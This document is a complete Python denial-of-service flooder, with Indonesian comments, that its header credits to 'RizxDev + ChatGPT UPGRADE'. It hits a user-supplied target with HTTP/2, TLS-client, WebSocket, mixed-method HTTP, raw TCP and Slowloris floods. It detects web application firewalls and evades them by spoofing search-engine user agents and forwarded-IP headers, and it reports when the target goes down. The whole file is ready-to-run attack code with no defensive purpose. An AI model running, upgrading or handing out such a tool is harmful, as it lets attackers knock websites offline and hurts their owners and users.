# 💣 RIZZDEV FULL L7 FLOODER 2025 - BRUTAL ALL VECTOR
# Author: RizxDev + ChatGPT UPGRADE
# Vector: HTTP/2, TLS-Client, WebSocket, RAW TCP/UDP, Slowloris, GET/POST/HEAD, Cachebuster, Header Spoof

import requests, httpx, threading, random, string, time, socket, os, ssl, re
from tls_client import Session
from websocket import create_connection
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor
from threading import Lock, Thread

# === KONFIGURASI DASAR ===
TARGET_URL = input("🔗 URL Target (https://example.com): ").strip().rstrip("/")
MAX_THREADS = int(input("🧵 Jumlah Threads: "))
ENABLE_VIEW = input("👁️ Aktifkan Spam View? (y/n): ").strip().lower() == 'y'

parsed = urlparse(TARGET_URL)
TARGET_DOMAIN = parsed.hostname
TARGET_IP = socket.gethostbyname(TARGET_DOMAIN)
TARGET_PORT = 443 if parsed.scheme == 'https' else 80
print(f"✅ Target IP: {TARGET_IP}:{TARGET_PORT}")

# === VARIABEL GLOBAL ===
sukses = gagal = view_sent = l4_sent = slow_conn = total_req = 0
last_status_code = 0
target_status = "🟢 OKE"
spoof_mode = False
lock = Lock()

# === UTILITAS ===
def kotak(text):
    lines = text.strip().split("\n")
    panjang = max(len(line) for line in lines)
    bar = "═" * (panjang + 4)
    box = [f"╔{bar}╗"]
    for line in lines:
        box.append(f"║  {line.ljust(panjang)}  ║")
    box.append(f"╚{bar}╝")
    return "\n".join(box)

def gen_data():
    base = ''.join(random.choices(string.ascii_letters + string.digits, k=1024))
    padding = ''.join(random.choices(string.printable, k=random.randint(256, 512)))
    return base + padding

def normal_headers():
    return {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119",
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

def spoofed_headers():
    ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    return {
        "User-Agent": random.choice([
            "Googlebot/2.1 (+http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        ]),
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "CF-Connecting-IP": ip,
        "Referer": f"https://google.com/search?q={random.randint(1111,9999)}",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }

def get_headers():
    return spoofed_headers() if spoof_mode else normal_headers()

# === WAF DETECTION ===
def detect_waf():
    global spoof_mode
    try:
        r = requests.get(f"{TARGET_URL}/?waf_check={random.randint(1111,9999)}", timeout=5)
        if r.status_code in [403, 405, 406]:
            spoof_mode = True
            print(f"🛡️ WAF terdeteksi ({r.status_code}) → Mengaktifkan header spoofing.")
        else:
            print(f"✅ Tidak terdeteksi WAF (Status: {r.status_code})")
    except:
        print("⚠️ Gagal cek WAF, lanjut default...")

# === VECTORS ===
def attack_http2():
    global last_status_code, sukses, gagal, total_req
    with httpx.Client(http2=True, timeout=5) as client:
        while True:
            try:
                url = f"{TARGET_URL}/?h2={random.randint(1000,9999)}"
                r = client.get(url, headers=get_headers())
                with lock:
                    last_status_code = r.status_code
                    sukses += 1
                    total_req += 1
            except:
                with lock:
                    gagal += 1
                    total_req += 1

def attack_tls_client():
    global last_status_code, sukses, gagal, total_req
    sess = Session(client_identifier="chrome_120")
    while True:
        try:
            sess.headers.update(get_headers())
            url = f"{TARGET_URL}/?tls={random.randint(1000,9999)}"
            r = sess.get(url, timeout=5)
            with lock:
                last_status_code = r.status_code
                sukses += 1
                total_req += 1
        except:
            with lock:
                gagal += 1
                total_req += 1

def attack_ws():
    try:
        ws = create_connection(TARGET_URL.replace("http", "ws"), timeout=5)
        while True:
            try:
                ws.send(gen_data())
                with lock:
                    global sukses, total_req
                    sukses += 1
                    total_req += 1
            except:
                with lock:
                    global gagal, total_req
                    gagal += 1
                    total_req += 1
                break
        ws.close()
    except:
        pass

def attack_l7_dual():
    global last_status_code, sukses, gagal, total_req
    while True:
        try:
            method = random.choice(["GET", "POST", "HEAD"])
            headers = get_headers()
            url = f"{TARGET_URL}/?dual={random.randint(1000,9999)}"
            if method == "POST":
                r = requests.post(url, headers=headers, data={"data": gen_data()}, timeout=5)
            else:
                r = requests.request(method, url, headers=headers, timeout=5)
            with lock:
                last_status_code = r.status_code
                sukses += 1
                total_req += 1
        except:
            with lock:
                gagal += 1
                total_req += 1

def attack_socket_raw():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(gen_data().encode())
            with lock:
                global l4_sent, total_req
                l4_sent += 1024
                total_req += 1
            s.close()
        except:
            with lock:
                total_req += 1

def slowloris():
    global slow_conn
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        s.send(f"GET /?slowloris={random.randint(1000,9999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {TARGET_DOMAIN}\r\n".encode())
        with lock:
            slow_conn += 1
        while True:
            s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
            time.sleep(10)
    except:
        with lock:
            if slow_conn > 0:
                slow_conn -= 1

def spam_view():
    global view_sent, total_req
    while True:
        try:
            url = f"{TARGET_URL}/?view={random.randint(100000,999999)}"
            r = requests.get(url, headers=get_headers(), timeout=5)
            with lock:
                view_sent += 1
                total_req += 1
        except:
            with lock:
                total_req += 1

def cek_target_status():
    global target_status
    try:
        r = requests.get(TARGET_URL, timeout=3)
        target_status = "🔴 DOWN" if r.status_code >= 500 else "🟢 OKE"
    except:
        target_status = "🔴 DOWN"

def monitor():
    global sukses, gagal, l4_sent, view_sent, total_req, slow_conn
    ps = pg = pl4 = pv = pslo = 0
    while True:
        time.sleep(5)
        cek_target_status()
        with lock:
            ds = sukses - ps
            dg = gagal - pg
            dl4 = l4_sent - pl4
            dv = view_sent - pv
            dsl = slow_conn - pslo
            ps, pg, pl4, pv, pslo = sukses, gagal, l4_sent, view_sent, slow_conn
            speed = (ds + dg) // 5
        if target_status == "🔴 DOWN":
            print("\n‼️ TARGET SAAT INI TUMBANG ‼️\n")
        print(kotak(f"""
📊 L7: ✅ Sukses: {sukses} ❌ Gagal: {gagal} 👁️ View: {view_sent} (+{dv})
🛁 L4: 📦 Data: {round(l4_sent/1024/1024, 2)} MB (+{round(dl4/1024/1024,2)} MB/s)
🐒 Slowloris: 🔗 Aktif: {slow_conn} ({'+' if dsl >=0 else ''}{dsl})
📿 CODE: {last_status_code} ⚡️ SPEED: {speed}/s
🔌 PORT: {TARGET_PORT} 📈 Total Req: {total_req}
🛁 STATUS: {target_status}
"""))

def main():
    os.system("clear")
    print(kotak("🔥 RIZZDEV FLOODER 2025 FULL VECTOR"))
    detect_waf()
    Thread(target=monitor, daemon=True).start()
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
        for _ in range(MAX_THREADS):
            ex.submit(attack_http2)
            ex.submit(attack_tls_client)
            ex.submit(attack_ws)
            ex.submit(attack_l7_dual)
            ex.submit(attack_socket_raw)
            ex.submit(slowloris)
            if ENABLE_VIEW:
                ex.submit(spam_view)

if __name__ == "__main__":
    main()
